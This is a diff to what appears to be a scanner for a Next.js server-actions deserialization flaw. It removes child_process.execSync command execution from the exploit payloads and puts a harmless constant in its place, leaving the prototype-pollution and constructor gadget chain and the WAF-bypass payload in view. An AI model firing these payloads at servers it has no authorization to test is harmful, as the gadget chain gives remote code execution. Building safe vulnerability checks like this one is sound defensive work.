@@ -67,7 +67,7 @@ function buildVercelWafBypassPayload(): [string, string] {
   const part0 =
     '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,' +
     '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":' +
-    '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;' +
+    '"var res=(10086).toString().trim();;' +
     "throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});\"," +
     '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}';
 
@@ -96,16 +96,11 @@ function buildRcePayload(options?: {
   wafBypassSizeKb?: number;
 }): [string, string] {
   const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
-  const windows = options?.windows ?? false;
   const wafBypass = options?.wafBypass ?? false;
   const wafBypassSizeKb = options?.wafBypassSizeKb ?? 128;
 
-  const cmd = windows ? 'powershell -c \\\\"41*271\\\\\"' : "echo $((41*271))";
-
   const prefixPayload =
-    "var res=process.mainModule.require('child_process').execSync('" +
-    cmd +
-    "')" +
+    "var res=(10086)" +
     ".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT')," +
     "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});";
 
@@ -296,7 +291,7 @@ function isVulnerableSafeCheck(response: ResponseLike): boolean {
 
 function isVulnerableRceCheck(response: ResponseLike): boolean {
   const redirectHeader = getHeader(response.headers, "X-Action-Redirect");
-  return /.*\/login\?a=11111.*/.test(redirectHeader);
+  return /.*\/login\?a=10086.*/.test(redirectHeader);
 }
 
 export async function checkVulnerability(
